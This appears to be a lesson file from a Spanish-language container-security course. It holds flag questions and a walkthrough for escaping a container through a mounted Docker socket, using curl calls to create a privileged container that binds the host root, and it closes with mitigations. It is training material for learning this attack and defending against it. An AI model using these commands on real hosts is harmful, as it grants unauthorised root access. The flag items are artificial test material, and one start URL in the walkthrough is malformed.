@@ -1,0 +1,68 @@
+---
+index: 3
+title: "Lab: escapa por el docker.sock"
+questions:
+  - id: containers-y-cloud-t03-q01
+    prompt: "Dentro del contenedor del lab, confirma con /version que el socket de /var/run/docker.sock controla el daemon del HOST. Envía la flag de recon."
+    hint: "curl -s --unix-socket /var/run/docker.sock http://localhost/version"
+    kind: flag
+  - id: containers-y-cloud-t03-q02
+    prompt: "Crea un contenedor privileged con bind / del host vía la API del socket. Envía la flag de las Warnings."
+    hint: "POST /containers/create con HostConfig: Privileged=true y Binds [/:/host] — primero envía el spec correcto"
+    kind: flag
+  - id: containers-y-cloud-t03-q03
+    prompt: "Arranca tu contenedor de escape y lee sus logs: has leído un fichero del host. Envía la flag final."
+    hint: "POST /containers/<id>/start (espera 204) y GET /containers/<id>/logs"
+    kind: flag
+---
+
+## Del socket al host
+
+Levanta el lab y entra:
+
+```bash
+cd labs/container-escape-lab && cp flags.env.example flags.env
+docker compose --env-file flags.env up -d
+docker exec -it lab-container-escape-shell-1 sh
+```
+
+El pecado original: alguien montó `/var/run/docker.sock` "para CI". El
+socket ES el docker CLI: quien habla con él, ES root en el host. Y
+hablarle es HTTP:
+
+```sh
+# 1. Recon — ¿esto controla el host?
+curl -s --unix-socket /var/run/docker.sock http://localhost/version
+
+# 2. ¿Qué corre ahí fuera?
+curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
+
+# 3. El escape completo:
+curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create \
+  -H 'Content-Type: application/json' \
+  -d '{"Image":"alpine","Cmd":["cat","/flag/host-secret.txt"],
+       "HostConfig":{"Privileged":true,"Binds":["/:/host"]}}'
+
+# 4. Arranca y lee:
+curl -s --unix-socket /var/run/docker.sock -X POST http://containers/<id>/start
+curl -s --unix-socket /var/run/docker.sock http://localhost/containers/<id>/logs
+```
+
+`Privileged: true` + `Binds: ["/:/host"]` = un contenedor que es el host
+con otro nombre. Desde su shell: `chroot /host sh` y eres root en la
+máquina física.
+
+(En el lab el daemon al otro lado es simulado — la técnica y cada
+llamada HTTP son las reales. El lab README lleva la defensa.)
+
+## Variantes del mismo bug
+
+- `--privileged` en el contenedor (no hace falta socket): los caps
+  abiertos permiten cargar módulos del kernel o mapear /dev/sda.
+- Cap SYS_MODULE suelto: `insmod` un módulo LKM propio → kernel pwned.
+- `/proc/sysrq-trigger` o cgroup release_agent escribibles.
+
+La mitigación ordenada: no montar el socket (socket-proxy read-only si
+no queda más remedio), cap_drop ALL + no-new-privileges SIEMPRE, runtime
+sandbox (gVisor/Kata) para lo no confiable, y nunca `--privileged`
+porque "el pipeline lo necesitaba".
